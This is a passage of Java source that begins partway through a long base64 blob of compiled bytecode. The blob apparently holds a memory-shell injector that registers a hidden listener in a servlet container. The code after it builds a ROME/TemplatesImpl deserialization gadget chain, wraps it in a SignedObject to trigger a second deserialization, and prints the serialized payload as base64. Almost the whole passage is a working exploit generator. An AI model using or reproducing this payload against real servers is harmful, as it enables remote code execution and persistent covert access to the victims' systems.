TspVgwAEgCYCgCXAJkBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcAmwEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAJ0BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwCfAQAJU2lnbmF0dXJlAQAmKClMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwCjAQAJY2xhenpCeXRlAQACW0IBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAK0BAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAK8AsAoAUgCxAQAOZ2V0Q2xhc3NMb2FkZXIMALMAiQoAfgC0DAAFAAYKAAIAtgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMALgAuQoArgC6AQALbmV3SW5zdGFuY2UMALwAOAoAfgC9DAAKAAYKAAIAvwEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMAMEAwgoAAgDDAQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IMAMUAxgoAAgDHCACnBwCmAQARamF2YS9sYW5nL0ludGVnZXIHAMsBAARUWVBFDADNAKoJAMwAzgEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwA0ADRCgB+ANIBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHANQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwA1gDXCgDVANgBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwA2gDbCgDMANwBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAN4A3woA1QDgAQAHb2JqZWN0cwEAE1tMamF2YS9sYW5nL09iamVjdDsBAAlsaXN0ZW5lcnMBAAlhcnJheUxpc3QBABVMamF2YS91dGlsL0FycmF5TGlzdDsBAAppc0luamVjdGVkAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylaDADnAOgKAAIA6QEAG2FkZEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcggA6wEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWgDtCgACAO4BABxnZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzCADwBwDjAQAQamF2YS91dGlsL0FycmF5cwcA8wEABmFzTGlzdAEAJShbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL3V0aWwvTGlzdDsMAPUA9goA9AD3AQAZKExqYXZhL3V0aWwvQ29sbGVjdGlvbjspVgwAEgD5CgBWAPoKAFYAhAEAHHNldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIAP0BAAd0b0FycmF5AQAVKClbTGphdmEvbGFuZy9PYmplY3Q7DAD/AQAKAFYBAQEAAWkBAAFJAQANZXZpbENsYXNzTmFtZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHNpemUBAAMoKUkMAQcBCAoAVgEJAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DAB2AQsKAFYBDAEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAETAQAHZm9yTmFtZQwBFQC5CgB+ARYBAAxkZWNvZGVCdWZmZXIIARgBAAlnZXRNZXRob2QMARoA0QoAfgEbAQAQamF2YS51dGlsLkJhc2U2NAgBHQEACmdldERlY29kZXIIAR8BAAZkZWNvZGUIASEBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgcBIwEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBLgEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HATABAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBMgoBLwApAQAFKFtCKVYMABIBNQoBMQE2AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAASATgKATMBOQEABHJlYWQBAAUoW0IpSQwBOwE8CgEzAT0BAAV3cml0ZQEAByhbQklJKVYMAT8BQAoBLwFBAQALdG9CeXRlQXJyYXkBAAQoKVtCDAFDAUQKAS8BRQEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAUsBTAoAAgFNAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAU8KAVAA2AoBUAB3AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwFTAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAFWAVcKAH4BWAEADWdldFN1cGVyY2xhc3MMAVoAegoAfgFbCgFUABQBAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lAQAHbWV0aG9kcwEAG1tMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAI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";

        TemplatesImpl template = utils.getTeml(Base64.getDecoder().decode(mem));
        ToStringBean toStringBean = new ToStringBean(Templates.class, "template");
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        HashMap hashmap = new HashMap();
        hashmap.put(equalsBean, "1");
        utils.setFieldValue(toStringBean,"_obj",template);

        SignedObject s = utils.makeSignedObject(hashmap);
        // 二次反序列化
        ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, "s");
        EqualsBean equalsBean2 = new EqualsBean(ToStringBean.class, toStringBean2);
        HashMap hashmap2 = new HashMap();
        hashmap2.put(equalsBean2, "1");
        utils.setFieldValue(toStringBean2,"_obj",s);

        byte[] ser = utils.serialize(hashmap2);
        String exp = Base64.getEncoder().encodeToString(ser);
        System.out.println(exp);
//        utils.unserialize(ser);
    }

}
